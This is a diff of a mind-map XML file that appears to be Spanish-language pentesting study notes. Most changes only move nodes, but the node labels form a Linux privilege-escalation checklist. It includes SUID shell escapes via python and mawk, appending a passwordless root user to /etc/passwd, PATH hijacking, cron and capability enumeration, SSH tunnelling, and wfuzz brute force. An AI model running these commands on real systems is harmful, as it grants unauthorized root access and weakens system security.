         </node>
-        <node id="235" posx="3340.843870757732" posy="811.66860961914176" maxwidth="200" width="81" height="46" side="right" fold="false" treesize="1131.7499999999977" color="#dc322f" colorroot="false" layout="Manual">
+        <node id="249" posx="1419.3269856770783" posy="491.14461263020991" maxwidth="200" width="81" height="46" side="right" fold="false" treesize="1108.75" color="#dc322f" colorroot="false" layout="Manual">
           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
           <formatting/>
           <nodename>PrivEsc</nodename>
           <nodenote></nodenote>
           <nodes>
-            <node id="237" posx="3521.8438707577347" posy="268.79360961914153" maxwidth="200" width="77" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="251" posx="1600.326985677081" posy="-51.73038736978998" maxwidth="200" width="77" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>sudo -l</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="239" posx="3521.8438707577366" posy="314.79360961914153" maxwidth="200" width="55" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="253" posx="1600.3269856770828" posy="-5.7303873697899803" maxwidth="200" width="55" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>su -</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="241" posx="3521.8438707577366" posy="360.79360961914199" maxwidth="200" width="122" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="255" posx="1600.3269856770828" posy="40.269612630210702" maxwidth="200" width="122" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>ls -la $HOME</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="243" posx="3521.8438707577366" posy="406.79360961914153" maxwidth="200" width="136" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="257" posx="1600.3269856770828" posy="86.26961263021002" maxwidth="200" width="136" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>ls -la /tmp /opt</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="245" posx="3521.8438707577329" posy="628.16860961914153" maxwidth="205.31241861979169" width="105" height="46" side="right" fold="false" treesize="309.08992513020837" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="259" posx="1600.3269856770792" posy="307.64461263021002" maxwidth="205.31241861979169" width="105" height="46" side="right" fold="true" treesize="309.08992513020837" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>servidores</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="247" posx="3853.8438707577329" posy="560.66860961914153" maxwidth="428.9808349609375" width="82" height="46" side="right" fold="false" treesize="182.65848795572919" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="261" posx="1932.3269856770796" posy="240.14461263021013" maxwidth="428.9808349609375" width="82" height="46" side="right" fold="true" treesize="182.65848795572919" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>Apache</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="249" posx="4330.8438707577297" posy="493.16860961914153" maxwidth="200" width="153" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="263" posx="2409.326985677073" posy="172.64461263021047" maxwidth="200" width="153" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>ls /var/www/html</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="251" posx="4330.8438707577334" posy="539.16860961914153" maxwidth="213.35921223958337" width="233" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="265" posx="2409.3269856770767" posy="218.64461263021013" maxwidth="213.35921223958337" width="233" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>/var/log/apache2/access.log</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="253" posx="4381.1509996639834" posy="611.827097574871" maxwidth="200" width="209" height="64" side="right" fold="false" treesize="64" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="267" posx="2459.6341145833248" posy="291.30310058593949" maxwidth="200" width="209" height="64" side="right" fold="true" treesize="64" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>/etc/apache2/sites-enabled/*.conf  (apache)</nodename>
@@ -965,19 +1020,19 @@ let output = Command::new(&#x201C;bash&#x201D;)
                     </node>
                   </nodes>
                 </node>
-                <node id="255" posx="3853.8438707577329" posy="662.91860961914199" maxwidth="211.99202473958337" width="232" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="269" posx="1932.3269856770796" posy="342.39461263021047" maxwidth="211.99202473958337" width="232" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>cat /etc/nginx/sites-enabled</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="257" posx="3726.8438707577338" posy="708.91860961914153" maxwidth="200" width="188" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="271" posx="1805.3269856770805" posy="388.39461263021002" maxwidth="200" width="188" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>/var/www/subdomain/</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="259" posx="3726.8438707577338" posy="756.25853474935025" maxwidth="200" width="141" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="273" posx="1805.3269856770805" posy="435.73453776041896" maxwidth="200" width="141" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>/var/www/html/</nodename>
@@ -985,49 +1040,49 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="261" posx="3521.8438707577366" posy="802.54360961914131" maxwidth="200" width="77" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="275" posx="1600.3269856770828" posy="482.01961263020945" maxwidth="200" width="77" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>ps aux</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="263" posx="3521.8438707577366" posy="848.54360961914131" maxwidth="336.0233154296875" width="356" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="277" posx="1600.3269856770828" posy="528.01961263020985" maxwidth="336.0233154296875" width="356" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>find / -readable 2&gt;/dev/null           -writeable</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="265" posx="3521.8438707577366" posy="894.54360961914267" maxwidth="242.65559895833348" width="262" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="279" posx="1600.3269856770828" posy="574.01961263021167" maxwidth="242.65559895833348" width="262" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>find / -group $grupo 2&gt;/dev/null</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="267" posx="3521.8438707577366" posy="940.54360961914131" maxwidth="222.69498697916674" width="250" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="281" posx="1600.3269856770828" posy="620.01961263020962" maxwidth="222.69498697916674" width="250" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>find / -users $user 2&gt;/dev/null</nodename>
               <nodenote></nodenote>
             </node>
-            <node id="269" posx="3521.8438707577347" posy="1009.5436096191399" maxwidth="225.35115559895848" width="248" height="46" side="right" fold="false" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="283" posx="1600.326985677081" posy="689.01961263020826" maxwidth="225.35115559895848" width="248" height="46" side="right" fold="true" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>find / -perm -4000 2&gt;/dev/null</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="271" posx="3869.8438707577347" posy="1009.5436096191399" maxwidth="200" width="138" height="46" side="right" fold="false" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="285" posx="1948.3269856770814" posy="689.01961263020826" maxwidth="200" width="138" height="46" side="right" fold="true" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>python / mawk</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="273" posx="4107.8438707577316" posy="986.5436096191404" maxwidth="402.65315755208326" width="422" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="287" posx="2186.3269856770794" posy="666.01961263020871" maxwidth="402.65315755208326" width="422" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>python -c 'import os; os.execl("/bin/bash", "sh", "-p")'</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="275" posx="4107.8438707577316" posy="1032.5436096191397" maxwidth="263.9833984375" width="282" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="289" posx="2186.3269856770794" posy="712.0196126302078" maxwidth="263.9833984375" width="282" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>mawk 'BEGIN {system("/bin/sh")}'</nodename>
@@ -1037,19 +1092,19 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="277" posx="3521.8438707577347" posy="1101.5436096191402" maxwidth="200" width="189" height="46" side="right" fold="false" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="291" posx="1600.326985677081" posy="781.01961263020826" maxwidth="200" width="189" height="46" side="right" fold="true" treesize="92" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>/etc/passwd writeable</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="279" posx="3810.8438707577347" posy="1078.5436096191402" maxwidth="315.9844970703125" width="308" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="293" posx="1889.3269856770814" posy="758.01961263020826" maxwidth="315.9844970703125" width="308" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>openssl passwd -1 -salt hacker hacker</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="281" posx="4218.8438707577316" posy="1078.5436096191402" maxwidth="475.0054931640625" width="502" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="295" posx="2297.3269856770785" posy="758.01961263020826" maxwidth="475.0054931640625" width="502" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash</nodename>
@@ -1057,7 +1112,7 @@ let output = Command::new(&#x201C;bash&#x201D;)
                     </node>
                   </nodes>
                 </node>
-                <node id="283" posx="3810.8438707577347" posy="1124.5436096191406" maxwidth="626.9661865234375" width="652" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="297" posx="1889.3269856770814" posy="804.01961263020871" maxwidth="626.9661865234375" width="652" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd (degrado seguridad sistema OJO!)</nodename>
@@ -1065,13 +1120,13 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="285" posx="3521.8438707577347" posy="1170.5436096191397" maxwidth="200" width="140" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="299" posx="1600.326985677081" posy="850.01961263020758" maxwidth="200" width="140" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>PATH Hijjacking</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="287" posx="3761.8438707577357" posy="1170.5436096191397" maxwidth="200" width="213" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="301" posx="1840.3269856770823" posy="850.01961263020758" maxwidth="200" width="213" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>export PATH=/tmp:$PATH</nodename>
@@ -1079,13 +1134,13 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="289" posx="3521.8438707577329" posy="1216.5436096191397" maxwidth="200" width="123" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="303" posx="1600.3269856770792" posy="896.01961263020758" maxwidth="200" width="123" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>CAPABILITIES</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="291" posx="3744.8438707577338" posy="1216.5436096191397" maxwidth="200" width="193" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="305" posx="1823.3269856770805" posy="896.01961263020758" maxwidth="200" width="193" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>getcap -r / 2&gt;/dev/null</nodename>
@@ -1093,19 +1148,19 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="293" posx="3521.8438707577329" posy="1262.5436096191411" maxwidth="200" width="71" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="307" posx="1600.3269856770792" posy="942.01961263020939" maxwidth="200" width="71" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>CRON</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="295" posx="3692.8438707577338" posy="1262.5436096191411" maxwidth="200" width="145" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="309" posx="1771.3269856770805" posy="942.01961263020939" maxwidth="200" width="145" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>cat /etc/crontab</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="297" posx="3937.8438707577347" posy="1263.0436096191411" maxwidth="200" width="28" height="45" side="right" fold="false" treesize="45" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="311" posx="2016.3269856770814" posy="942.51961263020939" maxwidth="200" width="28" height="45" side="right" fold="true" treesize="45" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename></nodename>
@@ -1115,19 +1170,19 @@ let output = Command::new(&#x201C;bash&#x201D;)
                 </node>
               </nodes>
             </node>
-            <node id="299" posx="3521.8438707577329" posy="1331.5436096191411" maxwidth="200" width="130" height="46" side="right" fold="false" treesize="91.999999999999091" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="313" posx="1600.3269856770792" posy="1011.0196126302094" maxwidth="200" width="130" height="46" side="right" fold="true" treesize="91.999999999999091" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>Portfowarding</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="301" posx="3783.8355699764847" posy="1308.5436096191411" maxwidth="295.99519856770826" width="308" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="315" posx="1862.3186848958314" posy="988.01961263020939" maxwidth="295.99519856770826" width="308" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ssh -L 9000:127.0.0.1:8000 user@ip</nodename>
                   <nodenote>Estoy redirigiendo 127.0.0.1:8000 a mi puerto 9000</nodenote>
                 </node>
-                <node id="303" posx="3751.8438707577347" posy="1354.5436096191402" maxwidth="200" width="86" height="46" side="right" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="317" posx="1830.3269856770814" posy="1034.0196126302085" maxwidth="200" width="86" height="46" side="right" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>chisel</nodename>
@@ -1139,13 +1194,13 @@ let output = Command::new(&#x201C;bash&#x201D;)
             </node>
           </nodes>
         </node>
-        <node id="305" posx="3340.8438707577311" posy="1400.5436096191429" maxwidth="200" width="104" height="46" side="right" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+        <node id="319" posx="1419.3269856770773" posy="1080.019612630211" maxwidth="200" width="104" height="46" side="right" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
           <formatting/>
           <nodename>bruteforce</nodename>
           <nodenote></nodenote>
           <nodes>
-            <node id="307" posx="3544.8438707577329" posy="1400.5436096191429" maxwidth="749.9818115234375" width="470" height="46" side="right" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+            <node id="321" posx="1623.3269856770792" posy="1080.019612630211" maxwidth="749.9818115234375" width="470" height="46" side="right" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>wfuzz -c -w possible_users --basic FUZZ:FUZZ --hc 401 $URL</nodename>
